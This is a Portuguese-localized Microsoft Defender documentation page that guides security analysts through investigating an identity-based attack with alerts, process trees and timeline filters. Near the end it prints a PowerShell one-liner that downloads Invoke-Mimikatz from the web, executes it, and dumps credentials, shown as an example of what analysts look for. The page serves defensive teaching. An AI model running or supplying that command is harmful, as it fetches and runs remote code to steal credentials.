---
title: Exemplo de um ataque baseado em identidade
description: Passo a passo de uma análise de exemplo de um ataque baseado em identidade.
keywords: incidentes, alertas, investigação, correlação, ataque, máquinas, dispositivos, usuários, identidades, identidade, caixa de correio, email, 365, microsoft, m365, resposta a incidentes, ataques cibernéticos
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 204530b8b4a87215053ddcb0434e40e45271da3d
ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
ms.translationtype: MT
ms.contentlocale: pt-BR
ms.lasthandoff: 06/08/2021
ms.locfileid: "52841001"
---
# <a name="example-of-an-identity-based-attack"></a><span data-ttu-id="1f608-104">Exemplo de um ataque baseado em identidade</span><span class="sxs-lookup"><span data-stu-id="1f608-104">Example of an identity-based attack</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

<span data-ttu-id="1f608-105">**Aplica-se a:**</span><span class="sxs-lookup"><span data-stu-id="1f608-105">**Applies to:**</span></span>
- <span data-ttu-id="1f608-106">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="1f608-106">Microsoft 365 Defender</span></span>

<span data-ttu-id="1f608-107">O Microsoft Defender for Identity pode ajudar a detectar tentativas mal-intencionadas de comprometer identidades em sua organização.</span><span class="sxs-lookup"><span data-stu-id="1f608-107">Microsoft Defender for Identity can help detect malicious attempts to compromise identities in your organization.</span></span> <span data-ttu-id="1f608-108">Como o Defender for Identity se integra ao Microsoft 365 Defender, os analistas de segurança podem ter visibilidade sobre as ameaças que vêm do Defender para Identidade, como tentativas suspeitas de elevação de privilégio netlogon.</span><span class="sxs-lookup"><span data-stu-id="1f608-108">Because Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.</span></span>

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a><span data-ttu-id="1f608-109">Analisando o ataque no Microsoft Defender for Identity</span><span class="sxs-lookup"><span data-stu-id="1f608-109">Analyzing the attack in Microsoft Defender for Identity</span></span>

<span data-ttu-id="1f608-110">Microsoft 365 O Defender permite que os analistas filtrem alertas por fonte de detecção na guia **Alertas** da página incidentes.</span><span class="sxs-lookup"><span data-stu-id="1f608-110">Microsoft 365 Defender allows analysts to filter alerts by detection source on the **Alerts** tab of the incidents page.</span></span> <span data-ttu-id="1f608-111">No exemplo a seguir, a fonte de detecção é filtrada para **Defender for Identity**.</span><span class="sxs-lookup"><span data-stu-id="1f608-111">In the following example, the detection source is filtered to **Defender for Identity**.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Exemplo de filtragem da fonte de detecção do Defender for Identity":::

<span data-ttu-id="1f608-113">Selecionar o alerta de ataque de passagem suspeita **de hash** vai para uma página no Microsoft Cloud App Security que exibe informações mais detalhadas.</span><span class="sxs-lookup"><span data-stu-id="1f608-113">Selecting the **Suspected overpass-the-hash attack** alert goes to a page in Microsoft Cloud App Security that displays more detailed information.</span></span> <span data-ttu-id="1f608-114">Você sempre pode saber mais sobre um alerta ou ataque selecionando [](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) **Saber** mais sobre esse tipo de alerta para ler uma descrição do ataque, bem como sugestões de correção.</span><span class="sxs-lookup"><span data-stu-id="1f608-114">You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.</span></span>
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Exemplo de um alerta de ataque do overpass-the-hash suspeito"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a><span data-ttu-id="1f608-116">Investigando o mesmo ataque no Microsoft Defender para Ponto de Extremidade</span><span class="sxs-lookup"><span data-stu-id="1f608-116">Investigating the same attack in Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="1f608-117">Como alternativa, um analista pode usar o Defender para o Ponto de Extremidade para saber mais sobre a atividade em um ponto de extremidade.</span><span class="sxs-lookup"><span data-stu-id="1f608-117">Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint.</span></span> <span data-ttu-id="1f608-118">Selecione o incidente na fila de incidentes e selecione a **guia Alertas.** A partir daqui, eles também podem identificar a fonte de detecção.</span><span class="sxs-lookup"><span data-stu-id="1f608-118">Select the incident from the incident queue, then select the **Alerts** tab. From here, they can identify the detection source as well.</span></span> <span data-ttu-id="1f608-119">Uma fonte de detecção rotulada como EDR significa Detecção e Resposta do Ponto de Extremidade, que é o Defender para Ponto de Extremidade.</span><span class="sxs-lookup"><span data-stu-id="1f608-119">A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint.</span></span> <span data-ttu-id="1f608-120">A partir daqui, o analista seleciona um alerta detectado por EDR.</span><span class="sxs-lookup"><span data-stu-id="1f608-120">From here, the analyst select an alert detected by EDR.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Exemplo de detecção e resposta de ponto de extremidade no Defender para Ponto de Extremidade"::: 

<span data-ttu-id="1f608-122">A página de alerta exibe várias informações pertinentes, como o nome do dispositivo afetado, o nome de usuário, o status da investigação automática e os detalhes do alerta.</span><span class="sxs-lookup"><span data-stu-id="1f608-122">The alert page displays various pertinent information such as the impacted device name, username, status of auto-investigation, and the alert details.</span></span> <span data-ttu-id="1f608-123">O artigo de alerta mostra uma representação visual da árvore de processos.</span><span class="sxs-lookup"><span data-stu-id="1f608-123">The alert story depicts a visual representation of the process tree.</span></span> <span data-ttu-id="1f608-124">A árvore de processos é uma representação hierárquica dos processos pai e filho relacionados ao alerta.</span><span class="sxs-lookup"><span data-stu-id="1f608-124">The process tree is a hierarchical representation of parent and child processes related to the alert.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Exemplo de uma árvore de processo de alerta no Defender para Ponto de Extremidade"::: 

<span data-ttu-id="1f608-126">Cada processo pode ser expandido para exibir detalhes adicionais.</span><span class="sxs-lookup"><span data-stu-id="1f608-126">Each process can be expanded to view additional details.</span></span> <span data-ttu-id="1f608-127">Os detalhes que um analista pode ver são os comandos reais que foram inseridos como parte de um script mal-intencionado, endereços IP de conexão de saída e outras informações úteis.</span><span class="sxs-lookup"><span data-stu-id="1f608-127">Details that an analyst can see are the actual commands that were entered as part of a malicious script, outbound connection IP addresses, and other useful information.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Exemplo de detalhes do processo no Defender para Ponto de Extremidade":::
 
<span data-ttu-id="1f608-129">Selecionando **See na linha do tempo,** um analista pode fazer uma pesquisa ainda mais fundo para determinar a hora exata do comprometimento.</span><span class="sxs-lookup"><span data-stu-id="1f608-129">By selecting **See in timeline**, an analyst can drill down even further to determine the exact time of the compromise.</span></span> 

<span data-ttu-id="1f608-130">O Microsoft Defender para Ponto de Extremidade pode detectar muitos arquivos e scripts mal-intencionados.</span><span class="sxs-lookup"><span data-stu-id="1f608-130">Microsoft Defender for Endpoint can detect many malicious files and scripts.</span></span> <span data-ttu-id="1f608-131">No entanto, devido a muitos usos legítimos para conexões de saída, PowerShell e atividade de linha de comando, algumas atividades seriam consideradas benignas até que criasse um arquivo ou atividade mal-intencionada.</span><span class="sxs-lookup"><span data-stu-id="1f608-131">However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity.</span></span> <span data-ttu-id="1f608-132">Portanto, o uso da linha do tempo ajuda os analistas a colocar o alerta no contexto com a atividade ao redor para determinar a origem ou a hora original do ataque que, de outra forma, é obscurecida pelo sistema de arquivos comum e pela atividade do usuário.</span><span class="sxs-lookup"><span data-stu-id="1f608-132">Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity.</span></span> 

<span data-ttu-id="1f608-133">Para fazer isso, um analista iniciaria no momento da detecção de alerta (em vermelho) e rolaria para baixo no tempo para determinar quando a atividade original que levou à atividade mal-intencionada realmente começou.</span><span class="sxs-lookup"><span data-stu-id="1f608-133">To do this, an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Exemplo de início no momento da detecção de alerta"::: 

<span data-ttu-id="1f608-135">É importante compreender e distinguir atividades comuns, como conexões do Windows Update Windows, tráfego de ativação de software confiável, outras conexões comuns com sites da Microsoft, atividade de internet de terceiros, atividade Microsoft Endpoint Configuration Manager e outras atividades benignas contra atividades suspeitas.</span><span class="sxs-lookup"><span data-stu-id="1f608-135">It is important to understand and distinguish common activity such as Windows Update connections, Windows Trusted Software activation traffic, other common connections to Microsoft sites, third-party Internet activity, Microsoft Endpoint Configuration Manager activity, and other benign activity from suspicious activity.</span></span> <span data-ttu-id="1f608-136">Uma maneira de fazer isso é usando filtros de linha do tempo.</span><span class="sxs-lookup"><span data-stu-id="1f608-136">One way to accomplish this is by using timeline filters.</span></span> <span data-ttu-id="1f608-137">Há muitos filtros que podem realçar a atividade específica ao filtrar qualquer coisa que o analista não queira exibir.</span><span class="sxs-lookup"><span data-stu-id="1f608-137">There are many filters that can highlight specific activity while filtering out anything that the analyst does not want to view.</span></span> 

<span data-ttu-id="1f608-138">Na imagem abaixo, o analista filtrado para exibir apenas eventos de rede e processo.</span><span class="sxs-lookup"><span data-stu-id="1f608-138">In the image below, the analyst filtered to view only network and process events.</span></span> <span data-ttu-id="1f608-139">Isso permite que o analista veja as conexões de rede e os processos ao redor do evento em que Bloco de notas estabeleceu uma conexão com um endereço IP, que também vimos na árvore de processo.</span><span class="sxs-lookup"><span data-stu-id="1f608-139">This allows the analyst to see the network connections and processes surrounding the event where Notepad established a connection with an IP address, which we also saw in the process tree.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Exemplo de como Bloco de notas usado para fazer uma conexão de saída mal-intencionada"::: 

<span data-ttu-id="1f608-141">Nesse evento específico, Bloco de notas foi usado para fazer uma conexão de saída mal-intencionada.</span><span class="sxs-lookup"><span data-stu-id="1f608-141">In this particular event, Notepad was used to make a malicious outbound connection.</span></span> <span data-ttu-id="1f608-142">No entanto, muitas vezes os invasores simplesmente usarão iexplorer.exe estabelecer conexões para baixar uma carga mal-intencionada porque normalmente os processos iexplorer.exe são considerados atividade regular do navegador da Web.</span><span class="sxs-lookup"><span data-stu-id="1f608-142">However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.</span></span>

<span data-ttu-id="1f608-143">Outro item a ser buscado na linha do tempo seria o Uso do PowerShell para conexões de saída.</span><span class="sxs-lookup"><span data-stu-id="1f608-143">Another item to look for in the timeline would be PowerShell uses for outbound connections.</span></span> <span data-ttu-id="1f608-144">O analista procuraria conexões bem-sucedidas do PowerShell com comandos, como seguido de uma conexão de saída para um site que hospeda `IEX (New-Object Net.Webclient)` um arquivo mal-intencionado.</span><span class="sxs-lookup"><span data-stu-id="1f608-144">The analyst would look for successful PowerShell connections with commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file.</span></span> 

<span data-ttu-id="1f608-145">No exemplo a seguir, o PowerShell foi usado para baixar e executar Mimikatz de um site:</span><span class="sxs-lookup"><span data-stu-id="1f608-145">In the following example, PowerShell was used to download and execute Mimikatz from a website:</span></span>

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
<span data-ttu-id="1f608-146">Um analista pode pesquisar rapidamente palavras-chave digitando na palavra-chave na barra de pesquisa para exibir somente eventos criados com o PowerShell.</span><span class="sxs-lookup"><span data-stu-id="1f608-146">An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with PowerShell.</span></span> 

## <a name="next-step"></a><span data-ttu-id="1f608-147">Próxima etapa</span><span class="sxs-lookup"><span data-stu-id="1f608-147">Next step</span></span>

<span data-ttu-id="1f608-148">Consulte o [caminho da investigação de phishing.](first-incident-path-phishing.md)</span><span class="sxs-lookup"><span data-stu-id="1f608-148">See the [phishing](first-incident-path-phishing.md) investigation path.</span></span>

## <a name="see-also"></a><span data-ttu-id="1f608-149">Confira também</span><span class="sxs-lookup"><span data-stu-id="1f608-149">See also</span></span>

- [<span data-ttu-id="1f608-150">Visão geral dos incidentes</span><span class="sxs-lookup"><span data-stu-id="1f608-150">Incidents overview</span></span>](incidents-overview.md)
- [<span data-ttu-id="1f608-151">Gerenciar incidentes</span><span class="sxs-lookup"><span data-stu-id="1f608-151">Manage incidents</span></span>](manage-incidents.md)
- [<span data-ttu-id="1f608-152">Investigar incidentes</span><span class="sxs-lookup"><span data-stu-id="1f608-152">Investigate incidents</span></span>](investigate-incidents.md)
